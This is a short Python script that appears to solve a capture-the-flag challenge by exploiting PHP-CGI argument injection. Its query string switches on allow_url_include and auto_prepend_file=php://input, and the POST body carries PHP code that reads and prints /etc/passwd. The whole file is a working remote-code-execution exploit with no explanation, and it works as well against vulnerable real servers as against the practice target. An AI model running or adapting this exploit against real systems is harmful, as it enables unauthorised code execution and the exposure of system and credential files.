#!/usr/bin/env python
# coding: UTF-8

import urllib
import urllib2
import requests


def main():
	url = 'http://ctfq.sweetduet.info:10080/~q12/index.php'
	code = "?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input"
	values = '''
	<?php
	$homepage = file_get_contents('/etc/passwd');
	echo $homepage;
	?>
	'''
	req = requests.post(url+code, data=values)
	print req.text

if __name__ == '__main__':
	main()